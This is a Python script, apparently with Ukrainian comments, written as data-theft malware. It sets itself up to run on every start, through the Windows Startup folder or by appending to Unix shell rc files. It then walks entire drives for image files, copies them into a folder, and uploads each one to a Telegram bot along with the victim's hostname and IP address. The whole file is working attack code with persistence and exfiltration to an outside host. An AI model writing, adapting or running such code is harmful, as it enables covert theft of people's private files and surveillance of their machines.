import os
import sys
import shutil
import socket
from multiprocessing import Pool,Process,Queue,Lock
import multiprocessing
import requests
import config
if os.name=='nt':
    try:
        import winshell
    except ImportError:
        print('Для вінди pip install winshell')

PROC_NUM=15
file_list=[]
sep='/'
def copyFile(src,dst):
    try:
        shutil.copy(src,dst)
    except shutil.Error as e:
        print('Error: %s' % e)
    except IOError as e:
        print('Error: %s' % e.strerror)

def get_files(directory_path,extlist):
    global file_list
    for root, dirs, files in os.walk(directory_path):
        for name in files:
            fname=os.path.join(root, name)
            if any([ele for  ele in extlist if fname.endswith("."+ele)]):
                file_list.append(fname)

def winntAutoRun():
    fname=sys.argv[0]
    Fname=fname.split('\\')[-1]
    startup = winshell.startup()
    newScripFName=startup+'\\'+Fname
    copyFile(fname,newScripFName)
    return


def addToAutoRun():
    global sep
    shell=os.environ['SHELL']
    home=os.environ['HOME']
    scrptName=sys.argv[0]
    sep='/'
    if os.name=='nt':
        sep='\\'
        newScripFName=home+sep+scrptName
    else:
        newScripFName=home+sep+scrptName
    copyFile(scrptName,newScripFName)
    copyFile("config.py",home+sep+"config.py")
    shell=shell[shell[::-1].index(sep)*(-1):]
    if os.name=='nt':
        shell=shell[:shell.index('.')]
    if any([ele for ele in ["bash","zsh","csh","ksh","tcsh"] if (ele==shell) ]):
        pass
    else:
        print('[-]Shell doesn\'t exist')
        return 
    if os.name=='nt':
        autoconf=f"{home}{sep}.{shell}rc"
    else:
        autoconf=f"{home}{sep}.{shell}rc"
    autoflg=False
    print(autoconf)
    if os.path.exists(autoconf):
        with open(autoconf,'r+') as shellrc:
            lines=shellrc.readlines()
            for line in lines:
                if f"python3 {scrptName}" in line:
                    autoflg=True
    if autoflg==True:
        print('!!!Файл вже додано для автозапуску!!!')
    else:
        print('Зараз додаємо файл в автозапуск')
        try:
            with open(autoconf,'a',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\npython3 {scrptName}")
        except FileNotFoundError:
            with open(autoconf,'x',encoding="utf-8", newline='') as shellrc:
                shellrc.write(f"\npython3 {scrptName}")            
    return

def send_document(bot_token,chtid,docfile,caption='Nothing'):
	url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
	data = {'chat_id' : chtid,'caption': caption}
	files={'document': open(docfile, 'rb')}
	r=requests.post(url,params=data,files=files)
	return


def superProc(fileList,num,extlist,hostdir,hostname):
    cnt=num
    global PROC_NUM
    global sep
    if os.name=='nt':
        sep='\\'
    print(f'Proc number {num} activated')
    while True:
        while len(fileList)>=num:
            try:
                fname=fileList[cnt]
                print(f'Proc {num}:',fname)
                newname=fname[len(fname)-fname[::-1].index(sep)-1:]
                copyFile(fname,f".{sep}{hostdir}{sep}{newname}")
                if fileList[cnt]=='TERMINATED':
                    return
                cnt+=PROC_NUM
            except:
                pass
            try:
                send_document(config.WIFI_BOT_TOKEN,config.CHTID,fname,f"Host:{hostname} - {fname}")
            except:
                print('[-]No connection')


def main():
    global PROC_NUM
    global sep
    global file_list
    if os.name!='nt':
        addToAutoRun()
    else:
        sep='\\'
        winntAutoRun()
    # mode
    mode = 0o666
    hostname=socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    hostdir=f"./{hostname}-files"
    if not os.path.exists(hostdir):
        print(f'!!!Create directory {hostdir}')#Creating directory for files from victim computer
        if os.name=='nt':
            os.mkdir(hostdir,mode)
        else:
            os.mkdir(hostdir)
    #extlist=['ini','inf','reg','sh','pl','py','sql']# here you type file extensions you want save on your USB device
    extlist=['jpg','jpeg','png','gif','ico']
    with multiprocessing.Manager() as manager:
        file_list=manager.list()
        procs=[]
        for num in range(1,PROC_NUM+1):
            procs.append(Process(target=superProc,args=(file_list,num,extlist,hostdir,f"{hostname} - IPADDR:{ip_address}")))
        for proc in procs:
            proc.start()

        if os.name!= 'nt':
            directory_path='/'
        else:
            directory_path=r'D:\\'
        get_files(directory_path,extlist) 
        if os.name=='nt':
            directory_path=r'C:\\'
            get_files(directory_path,extlist)
            
        for num in range(1,PROC_NUM+1):
            file_list.append('TERMINATED')

if __name__ == '__main__':
	main()